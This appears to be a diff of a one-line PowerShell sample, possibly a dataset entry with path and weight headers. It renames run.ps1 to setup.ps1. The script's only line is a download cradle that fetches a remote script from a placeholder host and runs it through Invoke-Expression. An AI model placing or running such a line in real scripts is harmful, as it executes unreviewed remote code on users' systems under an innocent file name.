@@ -1,4 +1,5 @@
-# path: run.ps1
+# path: setup.ps1
 # lines: 1
+# weight: 35
 # ---
 IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')
